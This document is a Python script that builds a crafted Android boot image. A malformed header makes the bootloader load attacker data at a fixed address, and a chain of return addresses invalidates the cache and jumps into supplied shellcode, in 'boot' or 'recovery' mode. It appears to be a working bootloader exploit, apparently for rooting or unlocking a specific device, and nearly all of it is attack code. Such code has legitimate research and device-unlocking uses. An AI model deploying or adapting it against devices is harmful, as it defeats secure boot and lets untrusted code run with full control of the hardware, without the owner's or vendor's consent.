#!/usr/bin/env python3
import sys
import struct
from argparse import ArgumentParser

base = 0x46000000

crafted_hdr_sz = 0x70
page_size = 4
inject_addr = 0x461416a0
inject_sz = 0x200 - crafted_hdr_sz

arch_clean_invalidate_cache_range = 0x4601C5A0

def main():
    parser = ArgumentParser()
    parser.add_argument('payload')
    parser.add_argument('-b', '--bootimg')
    parser.add_argument('-m', '--mode', help="Either boot or recovery")
    parser.add_argument('output')
    parser.add_argument('--microloader-only', action='store_true', help="Generate microloader.bin only")
    args = parser.parse_args()

    orig = b""

    if args.bootimg and not args.microloader_only:
        with open(args.bootimg, "rb") as fin:
            orig = fin.read(0x400)
            fin.seek(0x800)
            orig += fin.read()

    hdr = b"ANDROID!"
    hdr += struct.pack("<II", inject_sz, inject_addr -
                       crafted_hdr_sz + page_size)
    hdr += struct.pack("<IIIIIIII", 0, 0, 0, 0, 0, page_size, 0, 0)
    hdr += b"\x00" * 0x10
    hdr += b"bootopt=64S3,32N2,32N2 buildvariant=user"
    hdr += b"\x00" * (crafted_hdr_sz - len(hdr))

    assert len(hdr) == crafted_hdr_sz

    body = b''
    
    if args.mode == 'boot':
        shellcode_addr = inject_addr + 0x50
        cache_start = shellcode_addr & ~0x3f
        cache_size = 0x100
        
        body += struct.pack("<I", cache_start)
        body += struct.pack("<I", arch_clean_invalidate_cache_range)
        body += struct.pack("<I", cache_size)
        body += struct.pack("<I", 0x4601C7C8)

        body += struct.pack("<I", cache_start)
        body += struct.pack("<I", cache_size)
        body += struct.pack("<I", 0x03030303)
        body += struct.pack("<I", 0x04040404)
        body += struct.pack("<I", 0x12121212)
        body += struct.pack("<I", shellcode_addr)
        body += struct.pack("<I", arch_clean_invalidate_cache_range)
        
    elif args.mode == 'recovery':
        shellcode_addr = inject_addr + 0x30
        cache_start = shellcode_addr & ~0x3f
        cache_size = 0x100
        
        body += struct.pack("<I", cache_start)
        body += struct.pack("<I", arch_clean_invalidate_cache_range)
        body += struct.pack("<I", cache_size)
        body += struct.pack("<I", 0x4601C7C8)

        body += struct.pack("<I", cache_start)
        body += struct.pack("<I", cache_size)
        body += struct.pack("<I", 0x03030303)
        body += struct.pack("<I", 0x04040404)
        body += struct.pack("<I", 0x12121212)
        body += struct.pack("<I", shellcode_addr)
        body += struct.pack("<I", arch_clean_invalidate_cache_range)
    else:
        raise Exception("Unknown mode")

    current_len = len(body)
    shellcode_offset = shellcode_addr - inject_addr
    if current_len < shellcode_offset:
        body += b"\x00" * (shellcode_offset - current_len)

    print("addr = %#x" % (inject_addr + len(body)), flush=True)

    with open(args.payload, "rb") as fin:
        shellcode = fin.read()
    body += shellcode

    body += b"\x00" * (inject_sz - len(body))

    hdr += body
    hdr += b"\x00" * (0x400 - len(hdr))
    assert len(hdr) == 0x400

    if args.microloader_only:
        with open(args.output, "wb") as fout:
            fout.write(hdr)
        print("Generated microloader.bin")
    else:
        hdr += orig
        with open(args.output, "wb") as fout:
            fout.write(hdr)
        
        microloader_name = args.output.replace('.img', '_microloader.bin')
        with open(microloader_name, "wb") as fout:
            fout.write(hdr[:0x400])
        print("Generated full image and {}".format(microloader_name))


if __name__ == "__main__":
    main()